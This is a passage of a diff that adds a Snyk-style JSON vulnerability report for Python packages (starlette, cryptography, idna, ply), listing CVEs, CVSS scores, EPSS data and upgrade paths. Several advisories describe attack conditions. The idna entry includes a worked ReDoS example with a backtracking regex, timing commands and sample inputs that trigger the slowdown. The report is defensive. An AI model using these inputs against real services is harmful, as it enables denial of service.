+      "description": "## Overview\n[starlette](https://www.pypi.org/project/starlette) is a The little ASGI library that shines.\n\nAffected versions of this package are vulnerable to Use of Incorrectly-Resolved Name or Reference in the reconstruction of `request.url` when the HTTP request path does not begin with `/`. An attacker can mislead the application into trusting an attacker-controlled hostname by sending a specially crafted request path that manipulates the authority component of the URL. \n\n**Note:** This is only exploitable if the ASGI server forwards a request-target lacking a leading `/` into `scope[\"path\"]`, and the application uses `request.url`, `request.url.netloc`, or `request.url.hostname` for security-sensitive decisions before routing or in 404/exception handlers.\n## Remediation\nUpgrade `starlette` to version 1.3.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/Kludex/starlette/security/advisories/GHSA-jp82-jpqv-5vv3)\n- [GitHub Commit](https://github.com/Kludex/starlette/commit/167b5850e809f38b27fbfed62d58bf6442855975)\n",
+      "disclosureTime": "2026-06-15T20:38:08.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.08530",
+        "probability": "0.00187"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "1.3.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "starlette@1.0.0"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-STARLETTE-17342519",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-54282"
+        ],
+        "CWE": [
+          "CWE-706"
+        ],
+        "GHSA": [
+          "GHSA-jp82-jpqv-5vv3"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-02T11:05:28.000000Z",
+      "name": "starlette",
+      "packageManager": "pip",
+      "packageName": "starlette",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-06-16T10:50:53.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-jp82-jpqv-5vv3"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/Kludex/starlette/commit/167b5850e809f38b27fbfed62d58bf6442855975"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,1.3.0)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Use of Incorrectly-Resolved Name or Reference",
+      "upgradePath": [
+        false,
+        "starlette@1.3.0"
+      ],
+      "version": "1.0.0"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-06-16T12:32:39.000000Z",
+      "credit": [
+        "Frank Buss"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.7,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.7,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 7.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:H"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Out-of-bounds Read in the ASN.1 decoder. An attacker can crash the application or cause memory beyond the end of the input buffer to be loaded into the decoded ASN.1 object, by supplying very large input data. Applications that pass untrusted input to `d2i_X509()`, `d2i_PKCS7()`, or other `d2i_*` functions are affected. OpenSSL command line tools are not.\r\n\r\n**Note:** Only 64-bit Unix-like systems are vulnerable.\n## Remediation\nUpgrade `cryptography` to version 48.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/openssl/openssl/commit/e734e38ab606c62de2ee9410cb3222b99e6fc2e3)\n- [GitHub Security Advisory](https://github.com/pyca/cryptography/security/advisories/GHSA-537c-gmf6-5ccf)\n- [Vulnerability Advisory](https://openssl-library.org/news/secadv/20260609.txt)\n",
+      "disclosureTime": "2026-06-09T18:33:21.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.39566",
+        "probability": "0.00513"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "48.0.1"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "cryptography@44.0.0"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-CRYPTOGRAPHY-17344551",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-34180"
+        ],
+        "CWE": [
+          "CWE-125"
+        ],
+        "GHSA": [
+          "GHSA-537c-gmf6-5ccf"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-19T02:00:47.000000Z",
+      "name": "cryptography",
+      "packageManager": "pip",
+      "packageName": "cryptography",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-06-17T08:01:48.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/openssl/openssl/commit/e734e38ab606c62de2ee9410cb3222b99e6fc2e3"
+        },
+        {
+          "title": "GitHub Security Advisory",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-537c-gmf6-5ccf"
+        },
+        {
+          "title": "Vulnerability Advisory",
+          "url": "https://openssl-library.org/news/secadv/20260609.txt"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[0.5,48.0.1)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Out-of-bounds Read",
+      "upgradePath": [
+        false,
+        "cryptography@48.0.1"
+      ],
+      "version": "44.0.0"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-06-16T10:40:33.000000Z",
+      "credit": [
+        "Unknown"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 6.3,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.3,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 5.3,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 5.3,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
+      "description": "## Overview\n[starlette](https://www.pypi.org/project/starlette) is a The little ASGI library that shines.\n\nAffected versions of this package are vulnerable to Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') when dispatching HTTP requests to endpoint attributes via `getattr`. An attacker can invoke internal methods not intended as HTTP handlers by sending requests with non-standard HTTP methods whose names match internal attribute names, potentially bypassing authorization checks. \n\n**Note:** This is only exploitable if an `HTTPEndpoint` subclass is registered through `Route(...)` without specifying the `methods=` argument and the subclass defines additional methods matching non-standard HTTP-method token shapes that accept a single `request` argument and return a response.\n\n## Workaround \n\nThis vulnerability can be mitigated by registering `HTTPEndpoint` subclasses with an explicit `methods=` argument on the `Route`, listing only the supported HTTP verbs.\n## Remediation\nUpgrade `starlette` to version 1.1.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/Kludex/starlette/security/advisories/GHSA-x746-7m8f-x49c)\n- [GitHub Commit](https://github.com/Kludex/starlette/commit/e3f972225adb1d84b80dba132f520cc24cb84229)\n",
+      "disclosureTime": "2026-06-15T20:16:05.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.11437",
+        "probability": "0.00213"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "1.1.0"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "starlette@1.0.0"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-STARLETTE-17342514",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-48817"
+        ],
+        "CWE": [
+          "CWE-470"
+        ],
+        "GHSA": [
+          "GHSA-x746-7m8f-x49c"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-02T11:06:04.000000Z",
+      "name": "starlette",
+      "packageManager": "pip",
+      "packageName": "starlette",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-06-16T10:40:33.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/Kludex/starlette/security/advisories/GHSA-x746-7m8f-x49c"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/Kludex/starlette/commit/e3f972225adb1d84b80dba132f520cc24cb84229"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,1.1.0)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')",
+      "upgradePath": [
+        false,
+        "starlette@1.1.0"
+      ],
+      "version": "1.0.0"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-05-20T07:37:24.000000Z",
+      "credit": [
+        "Unknown"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 5.1,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 5.1,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 4,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "assigner": "NVD",
+          "baseScore": 5.3,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 5.3,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) through the `idna.encode()` function when processing very large domain name inputs that exploit the `valid_contexto()` function before length validation. This is triggered by arbitrarily large inputs that would not occur in normal usage, like `\"\\u0660\" * N` or `\"\\u30fb\" * N + \"\\u6f22\"` for large `N`. Such values may be passed to the library if there is no preliminary input validation by the higher-level application.\n\n**Note:** This is a bypass of the fix for the vulnerability described in [CVE-2024-3651](https://security.snyk.io/vuln/SNYK-PYTHON-IDNA-6597975).\n\n## Workaround \nThis vulnerability can be mitigated by enforcing a maximum domain name length of 253 characters before passing input to the function.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `idna` to version 3.15 or higher.\n## References\n- [GitHub Advisory](https://github.com/kjd/idna/security/advisories/GHSA-65pc-fj4g-8rjx)\n- [GitHub Commit](https://github.com/kjd/idna/commit/420aebc7e8dd35d929a035e7869f7ffd8288d3d0)\n- [GitHub Commit](https://github.com/kjd/idna/commit/ab7d46cbfd1e997fd82cfe05b44713eee009c583)\n",
+      "disclosureTime": "2026-05-12T21:00:00.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.32394",
+        "probability": "0.00408"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "3.15"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "idna@3.13"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-IDNA-16769942",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-45409"
+        ],
+        "CWE": [
+          "CWE-1333"
+        ],
+        "GHSA": [
+          "GHSA-65pc-fj4g-8rjx"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-02T11:06:03.000000Z",
+      "name": "idna",
+      "packageManager": "pip",
+      "packageName": "idna",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-05-20T07:37:24.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Advisory",
+          "url": "https://github.com/kjd/idna/security/advisories/GHSA-65pc-fj4g-8rjx"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/kjd/idna/commit/420aebc7e8dd35d929a035e7869f7ffd8288d3d0"
+        },
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/kjd/idna/commit/ab7d46cbfd1e997fd82cfe05b44713eee009c583"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,3.15)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Regular Expression Denial of Service (ReDoS)",
+      "upgradePath": [
+        false,
+        "idna@3.15"
+      ],
+      "version": "3.13"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-01-21T16:01:39.000000Z",
+      "credit": [
+        "bohmiiidd"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 9.3,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 9.3,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "critical",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 9.8,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "critical",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 7.8,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "description": "## Overview\n[ply](https://pypi.org/project/ply) is a Python Lex & Yacc\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data via the `picklefile` parameter in the `yacc` function. An attacker can execute arbitrary code by supplying a specially crafted pickle file that is deserialized without validation.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `ply`.\n## References\n- [Vulnerability Report](https://github.com/bohmiiidd/Undocumented-RCE-in-PLY)\n",
+      "disclosureTime": "2026-01-20T18:45:16.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.96667",
+        "probability": "0.16903"
+      },
+      "exploit": "Proof of Concept",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Proof of Concept",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Proof of Concept",
+            "type": "primary"
+          }
+        ],
+        "sources": [
+          "Snyk"
+        ]
+      },
+      "fixedIn": [],
+      "from": [
+        "sbom@0.0.0",
+        "ply@3.11"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-PLY-15046763",
+      "identifiers": {
+        "CVE": [
+          "CVE-2025-56005"
+        ],
+        "CWE": [
+          "CWE-502"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": false,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-30T14:04:21.000000Z",
+      "name": "ply",
+      "packageManager": "pip",
+      "packageName": "ply",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-01-21T16:01:39.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "Vulnerability Report",
+          "url": "https://github.com/bohmiiidd/Undocumented-RCE-in-PLY"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[0,]"
+        ]
+      },
+      "severity": "critical",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "critical",
+      "socialTrendAlert": false,
+      "title": "Deserialization of Untrusted Data",
+      "upgradePath": [],
+      "version": "3.11"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-03-29T10:38:35.000000Z",
+      "credit": [
+        "1seal"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 6.3,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.3,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 4.8,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        },
+        {
+          "assigner": "NVD",
+          "baseScore": 5.3,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 3.7,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "low",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Certificate Validation through the `NameChain` DNS verification logic in `src/rust/cryptography-x509-verification`. An attacker can make a peer name, such as `bar.example.com`, validate against a wildcard leaf certificate like `*.example.com` even when an issuing certificate in the chain excludes that DNS subtree, causing improper certificate acceptance.\r\n\r\n## Notes\r\n\r\n- The flaw affects X.509 path validation when DNS name constraints are present, and the leaf certificate uses a wildcard DNS SAN.\r\n- The maintainers note that ordinary X.509 topologies, including those used by the Web PKI, are not affected, and exploitation requires an uncommon certificate hierarchy.\n## Remediation\nUpgrade `cryptography` to version 46.0.6 or higher.\n## References\n- [GitHub Commit](https://github.com/pyca/cryptography/commit/91d728897bdad30cd5c79a2b23e207f1f050d587)\n- [Maintainer's Advisory](https://github.com/pyca/cryptography/security/advisories/GHSA-m959-cc7f-wv43)\n",
+      "disclosureTime": "2026-03-27T19:56:21.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.04848",
+        "probability": "0.00154"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "46.0.6"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "cryptography@44.0.0"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-CRYPTOGRAPHY-15809188",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-34073"
+        ],
+        "CWE": [
+          "CWE-295"
+        ],
+        "GHSA": [
+          "GHSA-m959-cc7f-wv43"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-06-16T02:01:03.000000Z",
+      "name": "cryptography",
+      "packageManager": "pip",
+      "packageName": "cryptography",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-03-29T10:39:35.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/pyca/cryptography/commit/91d728897bdad30cd5c79a2b23e207f1f050d587"
+        },
+        {
+          "title": "Maintainer's Advisory",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-m959-cc7f-wv43"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,46.0.6)"
+        ]
+      },
+      "severity": "medium",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "medium",
+      "socialTrendAlert": false,
+      "title": "Improper Certificate Validation",
+      "upgradePath": [
+        false,
+        "cryptography@46.0.6"
+      ],
+      "version": "44.0.0"
+    },
+    {
+      "alternativeIds": [],
+      "creationTime": "2026-02-11T08:24:18.000000Z",
+      "credit": [
+        "XlabAI Team",
+        "A7um"
+      ],
+      "cvssDetails": [],
+      "cvssScore": 8.2,
+      "cvssSources": [
+        {
+          "assigner": "Snyk",
+          "baseScore": 8.2,
+          "cvssVersion": "CVSSv4",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        },
+        {
+          "assigner": "Snyk",
+          "baseScore": 6.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+        },
+        {
+          "assigner": "Red Hat",
+          "baseScore": 7.4,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "high",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        },
+        {
+          "assigner": "NVD",
+          "baseScore": 6.5,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+        },
+        {
+          "assigner": "SUSE",
+          "baseScore": 5.9,
+          "cvssVersion": "CVSSv31",
+          "modificationTime": "0001-01-01T00:00:00.000000Z",
+          "severity": "medium",
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
